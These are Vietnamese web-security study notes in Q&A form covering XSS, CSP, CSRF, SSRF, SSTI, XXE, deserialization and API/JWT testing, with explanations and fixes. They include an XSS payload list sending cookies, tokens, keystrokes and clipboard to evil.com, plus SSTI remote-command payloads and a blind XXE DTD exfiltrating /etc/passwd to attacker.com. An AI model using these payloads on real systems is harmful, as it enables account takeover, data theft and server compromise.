> | `window.name` | Tên của cửa sổ/tab (giữ nguyên khi redirect) |
> | `postMessage` | Nhận dữ liệu từ cửa sổ/iframe khác gửi tới |
> | `localStorage` / `sessionStorage` | Đọc dữ liệu lưu trong trình duyệt |
> | `document.cookie` | Đọc cookie của trang hiện tại |
> 
> ## Sink (Đích nguy hiểm)
> 
> | Sink | Chức năng | Rủi ro |
> |------|-----------|--------|
> | `innerHTML` / `outerHTML` | Ghi HTML vào element | Parse và chạy script |
> | `document.write()` | Ghi trực tiếp vào trang | Chèn HTML/script |
> | `eval()` | Chạy chuỗi như code JS | RCE trên browser |
> | `setTimeout()` | Hẹn chạy code sau N ms | Nếu nhận chuỗi → chạy như JS |
> | `element.href` / `element.src` | Gán URL cho link/ảnh | `javascript:` scheme |
> | `location.href` | Chuyển hướng trang | `javascript:` scheme |
> | `jQuery.html()` / `jQuery.append()` | Ghi HTML qua jQuery | Tương tự innerHTML |
> 
> **Tóm gọn:** Source = nơi **lấy** dữ liệu vào. Sink = nơi **đưa** dữ liệu ra. Nếu dữ liệu từ source chảy vào sink mà không qua lọc → DOM XSS.
> 
> ## Ví dụ thực tế
> 
> **Source:**
> ```javascript
> var name = location.hash.slice(1);
> // URL: https://shop.com/#Alice
> // → name = "Alice"
> ```
> 
> **Sink:**
> ```javascript
> document.getElementById("greet").innerHTML = name;
> ```
> 
> **Khai thác:**
> ```
> https://shop.com/#<img src=x onerror=alert(1)>
> ```
> 
> ## Bảng tóm tắt
> 
> | | Source | Sink |
> |---|--------|------|
> | **Vai trò** | Đầu vào | Đầu ra |
> | **Ví dụ** | `location.hash` | `innerHTML` |
> | **Nguy hiểm** | Chứa payload | Thực thi payload |
> | **Cách fix** | Validate input | Escape output / dùng `textContent` |
> 
> **Tóm gọn:** DOM XSS xảy ra khi dữ liệu từ **source** (URL, hash, referrer...) chảy vào **sink** (innerHTML, eval...) mà không qua lọc. Không có source hoặc không có sink → không có DOM XSS.

> [!NOTE] XSS bị khai thác bởi CSRF
> kịch bản, trang web A chứa lỗ hổng reflect XSS, trang web B là trang web độc hại của attacker dựng lên nhằm tận dụng lỗ hổng xss của A. Ban đầu victim clik vào trang web B, trang web B bắt trình duyệt victim gửi request tới server A, mà cái rquest đó chứa payload xss, nhắm vào vị trí có lỗi như document.search. Server A nhận được thì gửi lại response(chứa payload ) về trang web A máy victim.Lúc này payload xss đã đưa về trang web A trên trình duyệt của victim, lúc đoạn payload xss giả sử là fetch('url attacker', document.cookie)--> mất cookie, và attacker có thể đăng nhập vào trang web A với tài khoản của victim


> [!NOTE]
> - Link rút gọn (`bit.ly/xxx`)
>     
> - Email phishing
>     
> - Comment trên forum
>     
> - iframe ẩn
>     
> - Auto-submit form


> [!NOTE]
> ## 1. Reflected XSS qua GET — Không cần CSRF
> 
> ```text
> 
> https://A.com/search?q=<script>alert(1)</script>
> ```
> - Attacker chỉ cần gửi link cho victim.
>     
> - Victim click → trình duyệt tự gửi GET → server phản chiếu → script chạy.
>     
> - **Đây là Reflected XSS thuần túy**, không phải CSRF.
>     
> 
> ## 2. Reflected XSS qua POST — Cần CSRF
> 
> Nếu endpoint XSS **chỉ chấp nhận POST** (không nhận GET), attacker không thể dùng link đơn giản. Lúc này cần **CSRF** làm cơ chế gửi request:
>
> ```html 
> <!-- Trang B của attacker -->
> <form action="https://A.com/comment" method="POST">
>   <input name="content" value="<script>alert(1)</script>">
> </form>
> <script>document.forms[0].submit()</script>
> ```

> [!NOTE]
> # Payload XSS phổ biến ngoài `alert()`
> 
> ## 1. Đánh cắp cookie / session
> 
> javascript
> 
> fetch('https://evil.com/?c='+document.cookie)
> new Image().src='https://evil.com/?c='+document.cookie
> document.location='https://evil.com/?c='+document.cookie
> 
> ## 2. Đánh cắp token / localStorage
> 
> javascript
> 
> fetch('https://evil.com/?t='+localStorage.getItem('token'))
> fetch('https://evil.com/?t='+JSON.stringify(localStorage))
> 
> ## 3. Keylogger
> 
> javascript
> 
> document.onkeypress = e => fetch('https://evil.com/?k='+e.key)
> 
> ## 4. Đọc nội dung trang / form
> 
> javascript
> 
> fetch('https://evil.com/?html='+btoa(document.body.innerHTML))
> fetch('https://evil.com/', {method:'POST', body:document.forms[0].innerHTML})
> 
> ## 5. Chụp màn hình (qua API)
> 
> javascript
> 
> navigator.mediaDevices.getDisplayMedia().then(s => ...)
> 
> ## 6. Thực hiện hành động thay victim
> 
> javascript
> 
> // Đổi email
> fetch('/api/change-email',{method:'POST',credentials:'include',
>   body:'email=evil@x.com'})
> // Đổi mật khẩu
> fetch('/api/change-password',{method:'POST',credentials:'include',
>   body:'newpass=hacked'})
> // Chuyển tiền
> fetch('/api/transfer',{method:'POST',credentials:'include',
>   body:'to=attacker&amount=1000'})
> 
> ## 7. Lấy CSRF token rồi submit form
> 
> javascript
> 
> fetch('/profile').then(r=>r.text()).then(html=>{
>   const token = html.match(/csrf_token" value="([^"]+)/)[1];
>   fetch('/change-email',{method:'POST',
>     body:'csrf='+token+'&email=evil@x.com'});
> });
> 
> ## 8. Redirect victim
> 
> javascript
> 
> location='https://evil.com/phishing'
> 
> ## 9. Load script ngoài (XSS nâng cao)
> 
> html
> 
> <script src="https://evil.com/x.js"></script>
> 
> ## 10. BeEF hook (framework XSS)
> 
> html
> 
> <script src="https://beef.attacker.com/hook.js"></script>
> 
> ## 11. Quét mạng nội bộ (nếu victim trong LAN)
> 
> javascript
> 
> fetch('http://192.168.1.1/admin',{mode:'no-cors'})
> 
> ## 12. Đánh cắp clipboard
> 
> javascript
> 
> navigator.clipboard.readText().then(t=>fetch('https://evil.com/?c='+t))
> 
> ## 13. Tấn công nội bộ (intranet)
> 
> javascript
> 
> fetch('http://internal-server/admin/delete-user?id=1',{credentials:'include'})
> 
> ## 14. WORM XSS (self-propagating)
> 
> javascript
> 
> fetch('/comment',{method:'POST',
>   body:'content=<script src=//evil.com/worm.js></script>'})
> 
> ---
> 
> ## Tóm gọn mục đích payload
> 
> |Mục đích|Payload mẫu|
> |---|---|
> |Lấy cookie|`fetch('//evil/?c='+document.cookie)`|
> |Lấy token|`fetch('//evil/?t='+localStorage.token)`|
> |Keylog|`onkeypress` + fetch|
> |Đổi mật khẩu|`fetch('/api/change',{method:'POST'})`|
> |Lấy CSRF token|fetch → regex → submit|
> |Redirect|`location='//evil'`|
> |Hook BeEF|`<script src=//beef/hook.js>`|
> |Worm|Tự POST payload vào comment|
> 
> **`alert()` chỉ để PoC. Payload thực chiến nhắm vào: session, token, hành động thay victim, hoặc leo thang.**

Câu 70. innerHTML nguy hiểm ở đâu?
Đáp án. Nếu đưa dữ liệu không tin cậy vào innerHTML, dữ liệu có thể được diễn giải như HTML và tạo điều kiện cho XSS.

Câu 71. textContent khác innerHTML thế nào?
Đáp án. textContent đặt nội dung như text; innerHTML diễn giải chuỗi như markup.

> [!NOTE]
> Mở Console (F12) và chạy:
> 
> ```javascript
> 
> // innerHTML
> document.body.innerHTML = "<img src=x onerror=alert('XSS')>";
> // → alert hiện ra
> // textContent
> document.body.textContent = "<img src=x onerror=alert('XSS')>";
> // → chỉ hiện chuỗi text, không có alert
> ```
> **Tóm gọn:** `innerHTML` parse chuỗi thành HTML → thẻ và script được thực thi → nguy hiểm. `textContent` đặt chuỗi là text thuần → browser chỉ hiển thị, không chạy → an toàn. Khi hiển thị dữ liệu người dùng, luôn dùng `textContent`.

Câu 72. CSP là gì?
Đáp án. Content Security Policy là <u>cơ chế browser policy để giới hạn nguồn script và các loại tài nguyên được phép, giúp giảm tác động của một số XSS.</u>

> [!NOTE]
> giới hạn nguồn script được chạy
> -là header mà server gửi về browser

Câu 73. CSP có ngăn XSS tuyệt đối không?
Đáp án. Không. Hiệu quả phụ thuộc <u>policy. CSP yếu, cấu hình sai hoặc ứng dụng vẫn có sink nguy hiểm thì rủi ro có thể còn</u>.

> [!NOTE]
> # Ví dụ ngắn: CSP là gì và có ngăn XSS tuyệt đối không?
> 
> ## 1. CSP là gì?
> 
> **CSP** là header server gửi về browser, khai báo **nguồn tài nguyên nào được phép load**.
> 
> **Ví dụ header:**
> ```http
> Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
> ```
> 
> **Giải thích:**
> - `default-src 'self'` → chỉ load tài nguyên từ chính domain.
> - `script-src 'self' https://trusted.com` → chỉ chạy script từ domain mình và trusted.com.
> 
> **Kết quả:**
> ```html
> <script src="https://evil.com/x.js"></script>  ← Bị chặn
> <script src="https://trusted.com/app.js"></script> ← Được chạy
> <script>alert(1)</script>  ← Bị chặn (inline script)
> ```
> 
> ## 2. CSP có ngăn XSS tuyệt đối không?
> 
> **Không.** Tùy vào policy.
> 
> ### CSP mạnh (khó bypass)
> ```http
> Content-Security-Policy: default-src 'none'; script-src 'nonce-random123'
> ```
> - Chỉ cho chạy script có nonce đúng.
> - Inline script, event handler đều bị chặn.
> 
> ### CSP yếu (dễ bypass)
> ```http
> Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'
> ```
> - `'unsafe-inline'` → cho phép inline script → XSS chạy được.
> - `'unsafe-eval'` → cho phép `eval()` → XSS chạy được.
> 
> ### CSP cấu hình sai
> ```http
> Content-Security-Policy: script-src 'self' *.googleapis.com
> ```
> - Nếu `googleapis.com` có JSONP endpoint → attacker lợi dụng để chạy script.
> - Ví dụ: `<script src="https://googleapis.com/jsonp?callback=alert(1)"></script>`.
> 
> ### CSP không cứu được nếu có sink nguy hiểm
> ```html
> <!-- CSP cho phép inline, attacker chèn vào innerHTML -->
> <div id="x"></div>
> <script>
>   document.getElementById("x").innerHTML = location.hash.slice(1);
> </script>
> ```
> → CSP không chặn được `innerHTML` nếu policy cho phép.
> 
> ## Bảng tóm tắt
> 
> | CSP | Ngăn XSS? |
> |-----|-----------|
> | `default-src 'none'; script-src 'nonce-xxx'` | Rất mạnh |
> | `script-src 'self'` | Mạnh, nhưng bypass nếu có JSONP |
> | `script-src 'self' 'unsafe-inline'` | Yếu |
> | `script-src 'self' 'unsafe-eval'` | Yếu |
> | `script-src *` | Vô dụng |
> | Không có CSP | Không ngăn |
> 
> ## Ví dụ thực tế
> 
> **CSP mạnh:**
> ```http
> Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'; object-src 'none'; base-uri 'none'
> ```
> → Ngay cả khi attacker chèn `<script>alert(1)</script>`, browser chặn vì không có nonce.
> 
> **CSP bypass:**
> ```http
> Content-Security-Policy: script-src 'self' https://ajax.googleapis.com
> ```
> → Attacker dùng JSONP của Google:
> ```html
> <script src="https://ajax.googleapis.com/jsonp?callback=alert(1)"></script>
> ```
> 
> **Tóm gọn:** CSP là lớp phòng thủ bổ sung, giới hạn nguồn script được chạy. CSP **mạnh + cấu hình đúng** giảm đáng kể XSS. Nhưng CSP **yếu, có `unsafe-inline`, có `unsafe-eval`, hoặc có JSONP endpoint** → vẫn bị bypass. Không bao giờ thay thế việc escape output và dùng sink an toàn.


Câu 74. <u>JavaScript escaping </u>và <u>HTML escaping</u> khác nhau thế nào?
Đáp án. Chúng bảo vệ các context khác nhau. Encoding phải phù hợp với nơi dữ liệu được chèn vào, không có một kiểu escape dùng an toàn cho mọi context.

> [!NOTE]
> # HTML escaping vs JS escaping
> 
> ||HTML escaping|JS escaping|
> |---|---|---|
> |**Làm gì**|Đổi `<`, `>`, `&`, `"`, `'` thành entity (`&lt;`, `&gt;`...)|Đổi `"`, `'`, `\`, `\n`, `</script>` thành ký tự escape (`\"`, `\'`...)|
> |**Để làm gì**|Chặn browser parse input thành thẻ HTML|Chặn input thoát ra khỏi chuỗi JS để chạy code|
> 
> **Ví dụ:**
> 
> |Input|HTML escaping|JS escaping|
> |---|---|---|
> |`<script>alert(1)</script>`|`&lt;script&gt;alert(1)&lt;/script&gt;` → hiện text|`\u003cscript\u003e...` → nằm trong chuỗi|
> |`"; alert(1); //`|Không đổi|`\"; alert(1); //` → nằm trong chuỗi|
> 
> **Quy tắc:** Chèn vào đâu → escape theo context đó. Sai context = vẫn dính XSS.

Câu 75. jQuery attr có thể gây DOM XSS thế nào?
Đáp án. Nếu một giá trị không tin cậy được đưa vào thuộc tính hoặc context nguy hiểm <u>thông qua API jQuery</u>, nó có thể tạo ra DOM XSS tùy cách ứng dụng sử dụng.

> [!NOTE]
> # jQuery `attr()` — DOM XSS
> ![[Pasted image 20261002000619.png]]
> **Code lỗi:**
> ```javascript
> $("#link").attr("href", location.hash.slice(1));
> ```
> 
> **Khai thác:**
> ```
> https://shop.com/#javascript:alert(document.cookie)
> ```
> 
> **Luồng:**
> ```
> location.hash → source
>      ↓
> attr("href", "javascript:alert(...)") → sink
>      ↓
> Victim click link → JS chạy → mất cookie
> ```
> 
> **Tương tự với `src`:**
> ```javascript
> $("#img").attr("src", userInput);
> // input: javascript:alert(1)  (hoặc data: URI chứa script)
> ```
> 
> **Fix:** Validate scheme, chỉ cho `http://` hoặc `https://`.


> [!NOTE] bổ sung thêm về agular js
> {{}}
> 

Câu 76. CSRF là gì?
Đáp án. Là lỗi khiến browser của nạn nhân gửi request có trạng thái xác thực đến ứng dụng mà nạn nhân không chủ động thực hiện action đó.
[[0-note-csrf]]
[[0-csrf]]

Câu 77. CSRF khác XSS thế nào?
Đáp án. XSS liên quan đến việc chạy script trong context của ứng dụng; CSRF lợi dụng browser và trạng thái xác thực để thực hiện request ngoài ý muốn.

Câu 78. CSRF Token là gì?
Đáp án. Là giá trị khó đoán được server kiểm tra kèm request để chứng minh request đến từ workflow hợp lệ.

Câu 79. SameSite Cookie giúp giảm CSRF thế nào?
Đáp án. Browser có thể hạn chế việc gửi cookie trong một số cross-site request, từ đó giảm khả năng request giả mạo mang theo session.

Câu 80. File Upload vulnerability là gì?
Đáp án. Là lỗi trong chức năng upload khiến attacker tải lên file không được phép hoặc file có thể tạo ra tác động ngoài ý định.
[[file upload]]
Câu 81. Chỉ kiểm tra extension có đủ an toàn không?
Đáp án. Không. Cần <u>kiểm tra file type</u>, <u>nội dung</u>,<u> tên file</u>,<u> storage location</u>, quyền truy cập và tuyệt đối không để file upload trở thành executable ngoài ý muốn.

Câu 82. MIME type có thể được tin tưởng hoàn toàn không?
Đáp án. Không. Header do client gửi có thể bị giả mạo nên cần validation server-side bằng nhiều lớp kiểm tra.

Câu 83. Làm sao secure file upload?
Đáp án. <u>Allowlist loại file</u>, giới hạn kích thước, kiểm tra nội dung, đổi tên file, lưu ngoài web root khi phù hợp, vô hiệu hóa execute và áp dụng quyền tối thiểu.

Câu 84. Security Misconfiguration là gì?
Đáp án. Là cấu hình hệ thống không an toàn như <u>debug bật trên production</u>, <u>credential mặc định</u>,<u> directory listing</u> hoặc service không cần thiết đang public.

============================================================
TẬP 5 – SSRF, SSTI, XXE, DESERIALIZATION
============================================================
[[0-roadmap SSRF]]
Câu 85. SSRF là gì?
Đáp án. SSRF là lỗi <u>khiến server gửi request đến địa chỉ do attacker kiểm soát hoặc tác động</u>, từ đó <u>server có thể truy cập tài nguyên mà client không truy cập trực tiếp được</u>.

Câu 86. Vì sao localhost quan trọng trong SSRF?
Đáp án. Vì <u>request từ server đến localhost có thể chạm vào service nội bộ chỉ bind trên loopback hoặc không public ra Internet.</u>

Câu 87. SSRF có thể ảnh hưởng hệ thống nào?
Đáp án. Có thể<u> ảnh hưởng internal services, cloud metadata endpoints, admin interfaces hoặc các service nội bộ khác</u> tùy network architecture.

Câu 88. Blind SSRF là gì?
Đáp án. Là trường hợp server thực hiện request nhưng ứng dụng không hiển thị trực tiếp nội dung response cho attacker.

Câu 89. SSRF URL parser bypass là gì?
Đáp án. Là kỹ thuật tận dụng khác biệt giữa ~~<u>parser hoặc validation logic</u>~~ và <u>HTTP client </u>thực tế để vượt qua kiểm tra URL.

Câu 90. Cách phòng SSRF cơ bản?
Đáp án.<u> Allowlist destination </u>khi có thể, parse URL đúng chuẩn, resolve DNS cẩn thận, chặn private và loopback ranges, giới hạn protocol và áp dụng network egress controls.

Câu 91. SSTI là gì?
Đáp án. Server-Side Template Injection xảy ra khi <u>input của attacker </u>được<u> template engine xử lý</u> như<u> template thay vì chỉ là dữ liệu.</u>

> [!NOTE]
> # SSTI là gì?
> 
> **SSTI (Server-Side Template Injection)** xảy ra khi input của user được **template engine xử lý như code template** thay vì chỉ là dữ liệu.
> 
> ## Ví dụ
> 
> **Code lỗi (Flask + Jinja2):**
> ```python
> @app.route("/hello")
> def hello():
>     name = request.args.get("name")
>     return render_template_string("Xin chào " + name)  # ← Nối chuỗi
> ```
> 
> **Test:**
> ```
> /hello?name={{7*7}}
> ```
> 
> **Kết quả:**
> ```
> Xin chào 49
> ```
> 
> → Template engine **tính toán** `7*7` thay vì hiển thị chuỗi `{{7*7}}` → có SSTI.
> 
> **Khai thác:**
> ```
> /hello?name={{config}}
> → Lộ SECRET_KEY, database URI
> 
> /hello?name={{cycler.__init__.__globals__.os.popen('id').read()}}
> → uid=33(www-data) gid=33(www-data)  → RCE
> ```
> 
> ## So sánh
> 
> | Input | Không lỗi | Có SSTI |
> |-------|-----------|---------|
> | `{{7*7}}` | Hiện `{{7*7}}` | Hiện `49` |
> 
> **Tóm gọn:** SSTI = user input bị template engine hiểu là code. Test bằng `{{7*7}}` — nếu ra `49` là dính. Khai thác thường dẫn tới RCE.


> [!NOTE]
> nếu csrf <-->ssrf thì cũng có xss<-->sstj

Câu 92. SSTI khác XSS thế nào?
Đáp án. <u>SSTI xảy ra ở phía server</u> trong template engine; <u>XSS thường tác động đến browser/client context</u>.

Câu 93. Làm sao xác định template engine?
Đáp án. <u>Dựa vào syntax phản hồi,</u> <u>hành vi của các expression thử nghiệm</u> và fingerprint framework hoặc source code nếu có.

Câu 94. Vì sao SSTI có thể dẫn đến RCE?
Đáp án. <u>Một số template engine cung cấp khả năng truy cập object hoặc function mạnh ở server</u>; nếu sandbox hoặc context yếu, attacker có thể leo tới thực thi lệnh.

> [!NOTE]
> 
> # SSTI dẫn đến RCE — Ví dụ & Chức năng hay dính
> 
> ## 1. Vì sao SSTI → RCE?
> 
> Template engine (Jinja2, Twig, Freemarker...) ==cho phép truy cập **object/function mạnh** của ngôn ngữ==. ==Nếu sandbox yếu, attacker leo từ object → class → module → OS command.==
> 
> ## 2. Ví dụ theo engine
> 
> ### Jinja2 (Python)
> ```python
> # Đọc config
> {{ config }}
> 
> # Leo qua object chain
> {{ ''.__class__.__mro__[1].__subclasses__() }}
> 
> # RCE qua os.popen
> {{ cycler.__init__.__globals__.os.popen('id').read() }}
> {{ lipsum.__globals__.os.popen('whoami').read() }}
> ```
> 
> ### Twig (PHP)
> ```php
> {{_self.env.registerUndefinedFilterCallback("exec")}}
> {{_self.env.getFilter("id")}}
> ```
> 
> ### Freemarker (Java)
> ```java
> <#assign ex="freemarker.template.utility.Execute"?new()>
> ${ex("id")}
> ```
> 
> ### Velocity (Java)
> ```java
> #set($e="e")
> $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
> ```
> 
> ### Handlebars (Node.js)
> Cần gadget chain dài, thường dùng prototype pollution kết hợp.
> 
> ## 3. Chức năng hay dính SSTI
> 
>**Email chào mừng:**
> - Server cần tạo nội dung email → gửi qua SMTP → Gmail/Outlook nhận.
>     
> - Gmail **không chạy JS** trong email (chặn vì bảo mật).
>     
> - → Phải render ở server trước khi gửi.
>     
> 
> **PDF hóa đơn:**
> 
> - Server cần tạo file PDF → tải về hoặc gửi khách.
>     
> - PDF là file tĩnh, không phải trang web.
>     
> - → Phải render ở server.
>     
> 
> **Notification (push):**
> 
> - Server gửi thông báo tới app.
>     
> - → Phải tạo nội dung ở server.
> > 
> ## 4. Dấu hiệu nhận biết
> 
> Test bằng payload toán học:
> ```
> {{7*7}}     → 49 (Jinja2/Twig)
> ${7*7}      → 49 (Freemarker/Velocity)
> #{7*7}      → 49 (Ruby)
> <%= 7*7 %>  → 49 (ERB/EJS)
> ```
> 
> Nếu ra `49` → có SSTI.
> 
> ## 5. Nguyên nhân
> 
> ```python
> # SAI — nối chuỗi
> render_template_string("Hello " + name)
> 
> # ĐÚNG — truyền biến
> render_template_string("Hello {{ name }}", name=name)
> ```
> 
> **Tóm gọn:** SSTI → RCE vì template engine cho truy cập object nội bộ (class, module, `os`, `Runtime`). Chức năng hay dính: email, PDF, preview, notification, report — bất kỳ chỗ nào **nối input vào template**. ==Fix bằng cách truyền input như biến, không nối chuỗi==.

Câu 95. XXE là gì?
Đáp án. XML External Entity là lỗi khi ==XML parser cho phép xử lý external entity do dữ liệu XML điều khiển==.

> [!NOTE]
> # XML là gì?
> 
> **XML (eXtensible Markup Language)** — ngôn ngữ đánh dấu để **lưu trữ và truyền dữ liệu** có cấu trúc. Giống HTML nhưng **không có thẻ cố định**, user tự định nghĩa thẻ.
> 
> ## Ví dụ
> 
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <user>
>     <name>Alice</name>
>     <email>alice@example.com</email>
>     <role>admin</role>
> </user>
> ```
> 
> ## Đặc điểm
> 
> - Thẻ mở/đóng: `<name>...</name>`
> - Lồng nhau (nested)
> - Có thuộc tính: `<user id="1">`
> - Có khai báo: `<?xml version="1.0"?>`
> - Có DTD (Document Type Definition) — định nghĩa cấu trúc + entity
> 
> ## Dùng ở đâu
> 
> - API cũ (SOAP)
> - File cấu hình (pom.xml, web.xml)
> - Office: .docx, .xlsx, .pptx (là ZIP chứa XML)
> - RSS, sitemap.xml
> - SAML (SSO)
> - SVG (ảnh vector)
> 
> ## So với JSON
> 
> | XML | JSON |
> |-----|------|
> | `<user><name>Alice</name></user>` | `{"user":{"name":"Alice"}}` |
> | Verbose hơn | Ngắn gọn hơn |
> | Hỗ trợ entity, DTD | Không |
> | Hay dùng cho SAML, SOAP | Hay dùng cho REST API |
> 
> ==**Tóm gọn:** XML là ngôn ngữ đánh dấu để lưu/truyền dữ liệu có cấu trúc, cho phép user tự định nghĩa thẻ. Vì có tính năng **external entity** nên dễ dính XXE nếu parser không tắt.==

> [!NOTE]
> 
> ### Câu 95: XXE là gì?
> 
> **XXE (XML External Entity)** — lỗi khi XML parser xử lý **external entity** do user kiểm soát.
> 
> **XML hợp lệ:**
> ```xml
> <user><name>Alice</name></user>
> ```
> 
> **XML có external entity (nguy hiểm):**
> ```xml
> <?xml version="1.0"?>
> <!DOCTYPE foo [
>   <!ENTITY xxe SYSTEM "file:///etc/passwd">
> ]>
> <user><name>&xxe;</name></user>
> ```
> 
> → Parser đọc `file:///etc/passwd` và chèn vào chỗ `&xxe;` → lộ file.
> 
> ---
> 
> ### Câu 96: XXE đọc file thế nào?
> 
> **Input:**
> ```xml
> <?xml version="1.0"?>
> <!DOCTYPE foo [
>   <!ENTITY xxe SYSTEM "file:///etc/passwd">
> ]>
> <user>
>   <name>&xxe;</name>
> </user>
> ```
> 
> **Server parse → trả về:**
> ```xml
> <user>
>   <name>root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:...
>   </name>
> </user>
> ```
> 
> → Nội dung `/etc/passwd` xuất hiện trong response.
> 
> **Blind XXE (không thấy response):**
> ```xml
> <!DOCTYPE foo [
>   <!ENTITY % file SYSTEM "file:///etc/passwd">
>   <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
>   %dtd;
> ]>
> ```
> 
> `evil.dtd`:
> ```xml
> <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
> %all;
> ```
> 
> → Server gửi nội dung file tới attacker qua HTTP callback.
> 
> **Tóm gọn:** XXE = parser xử lý external entity → đọc file local (`file://`), SSRF (`http://`), hoặc DoS. Fix bằng cách **tắt external entity** trong parser.

Câu 96. XXE có thể đọc file thế nào?
Đáp án. Nếu parser cho phép external entity truy cập local resource, entity có thể tham chiếu đến file và làm nội dung đó xuất hiện trong response hoặc kênh khác.

Câu 97. Blind XXE là gì?
Đáp án. Là XXE không trả dữ liệu trực tiếp nhưng có thể tạo external interaction để suy luận hoặc lấy dữ liệu qua kênh ngoài.

Câu 98. Insecure Deserialization là gì?
Đáp án. Là việc deserialize dữ liệu không tin cậy theo cách cho phép thay đổi object state hoặc kích hoạt gadget chain ngoài ý muốn.

Câu 99. Vì sao deserialization có thể dẫn đến RCE?
Đáp án. Trong một số framework, attacker có thể lợi dụng chuỗi gadget có sẵn để điều khiển hành vi khi object được deserialize.

Câu 100. Làm sao phòng insecure deserialization?
Đáp án. Tránh deserialize dữ liệu không tin cậy, dùng format an toàn, kiểm tra type chặt chẽ, ký dữ liệu khi phù hợp và hạn chế quyền của process.


# TẬP 6 – API PENTEST, JWT, BUSINESS LOGIC


Câu 101. API Pentest khác Web Pentest thế nào?
Đáp án. API Pentest tập trung nhiều vào endpoint, method, object authorization, token, schema, rate limit, business logic và dữ liệu JSON/XML.

> [!NOTE]
> 
> Để dễ hình dung, hãy tưởng tượng **Web Pentest** giống như bạn đang cố đột nhập vào một tòa nhà qua **cửa chính (giao diện người dùng)**, còn **API Pentest** là bạn đi thẳng vào **hệ thống đường ống ngầm, kho bãi, và các cửa hậu (giao tiếp giữa các hệ thống)**.
> 
> Dưới đây là ví dụ cụ thể cho từng điểm khác biệt mà bạn đã liệt kê:
> 
> ### 1. Endpoint & Method (Điểm cuối và Phương thức)
> *   **Web Pentest:** Bạn nhìn thấy một form đăng nhập trên trình duyệt. Bạn chỉ có thể gửi dữ liệu bằng phương thức `POST` thông qua giao diện đó.
> *   **API Pentest:** Bạn dùng Postman hoặc Burp Suite để gọi trực tiếp. Bạn thấy endpoint là `POST /api/v1/users/login`. Bạn có thể thử đổi method thành `PUT`, `DELETE`, hoặc `PATCH` để xem API có xử lý sai không. (Ví dụ: `DELETE /api/v1/users/1` để thử xóa user khác).
> 
> ### 2. Object Authorization (Phân quyền đối tượng - BOLA/IDOR)
> *   **Web Pentest:** Bạn đăng nhập vào tài khoản A, truy cập `https://bank.com/profile`. Bạn không thể xem profile của người khác vì URL không chứa ID.
> *   **API Pentest:** API trả về dữ liệu dạng JSON. Request là `GET /api/v1/accounts/1001`. Bạn thử đổi thành `GET /api/v1/accounts/1002`. Nếu server trả về dữ liệu của tài khoản 1002 (dù bạn đang dùng token của tài khoản 1001), đó là lỗi **BOLA (Broken Object Level Authorization)** – lỗi phổ biến nhất trong API.
> 
> ### 3. Token (Xác thực)
> *   **Web Pentest:** Xác thực dựa trên **Cookie** (ví dụ: `sessionid=abc123`). Bạn quan tâm đến lỗi CSRF, lỗi SameSite cookie.
> *   **API Pentest:** Xác thực dựa trên **Token** (ví dụ: `Authorization: Bearer eyJhbGci...`). Bạn quan tâm đến lỗi JWT (thuật toán `none`, làm giả chữ ký), OAuth2 (lỗi redirect_uri), API Key bị lộ trong code.
> 
> ### 4. Schema & Dữ liệu (JSON/XML)
> *   **Web Pentest:** Server trả về HTML. Bạn test XSS bằng cách chèn `<script>alert(1)</script>` vào form.
> *   **API Pentest:** Server trả về JSON. Bạn test **Mass Assignment** bằng cách thêm trường `"is_admin": true` vào payload đăng ký. Nếu server tự động cập nhật quyền admin, đó là lỗi. Bạn cũng test xem API có validate schema không (ví dụ: gửi chuỗi thay vì số, gửi thiếu trường bắt buộc).
> 
> ### 5. Rate Limit (Giới hạn tần suất)
> *   **Web Pentest:** Bạn thử brute-force form login. Hệ thống thường chặn bằng Captcha hoặc khóa tài khoản sau vài lần sai.
> *   **API Pentest:** Bạn gửi 10,000 request `POST /api/v1/otp/verify` với mã OTP từ 0000 đến 9999. Nếu API không có Rate Limit, bạn có thể brute-force thành công OTP. API thường bị bỏ quên Rate Limit hơn so với Web.
> 
> ### 6. Business Logic (Logic nghiệp vụ)
> *   **Web Pentest:** Bạn thêm sản phẩm vào giỏ hàng. Giao diện hiển thị giá là $100. Bạn không thể sửa giá trên giao diện.
> *   **API Pentest:** Bạn bắt request `POST /api/v1/cart` với body: `{"item_id": 1, "quantity": 1, "price": 100}`. Bạn sửa `price` thành `1` và gửi lại. Nếu server tin tưởng dữ liệu từ client và tính tiền $1, đó là lỗi Logic nghiệp vụ (Parameter Tampering).
> 
> ---
> 
> ### Bảng tóm tắt so sánh nhanh:
> 
> | Tiêu chí | Web Pentest | API Pentest |
> | :--- | :--- | :--- |
> | **Giao tiếp** | HTML, CSS, JS (Giao diện) | JSON, XML, GraphQL (Dữ liệu thô) |
> | **Xác thực** | Cookie, Session | Bearer Token, JWT, API Key |
> | **Phương thức** | Chủ yếu GET, POST | Đa dạng: GET, POST, PUT, DELETE, PATCH |
> | **Lỗi phổ biến** | XSS, CSRF, Clickjacking | BOLA, Mass Assignment, JWT flaws |
> | **Công cụ** | Burp Suite (Proxy), Browser | Postman, Burp Suite (Repeater), Swagger UI |
> 
> **Kết luận:** Web Pentest tập trung vào việc lừa **trình duyệt** và **người dùng**, trong khi API Pentest tập trung vào việc lừa **logic của server** và khai thác **dữ liệu thô**.
> 

Câu 102. Bạn kiểm tra authentication của API như thế nào?
Đáp án. Xác định cơ chế token hoặc session, <u>thử thiếu token</u>, <u>token sai, token hết hạn, token thuộc user khá</u>c và kiểm tra server có enforce đúng hay không.

Câu 103. JWT là gì?
Đáp án. JSON Web Token là một format token phổ biến<u> gồm header</u>, <u>payload</u> và<u> signature.</u>

Câu 104. JWT signature dùng để làm gì?
Đáp án. Signature giúp<u> server kiểm tra token có bị thay đổi và có được ký bởi bên tin cậy hay không</u>.

Câu 105. Có được sửa JWT payload trực tiếp không?
Đáp án. Có thể sửa chuỗi ở phía client về mặt kỹ thuật, nhưng server phải kiểm tra signature; nếu không kiểm tra đúng thì mới thành vulnerability.

> [!NOTE]
> Khi pentest **cổng đăng nhập (Login Portal)** và **JWT (JSON Web Token)**, bạn thường phải kết hợp cả hai vì cổng đăng nhập là nơi cấp phát token, còn JWT là "chìa khóa" để duy trì phiên đăng nhập. 
> 
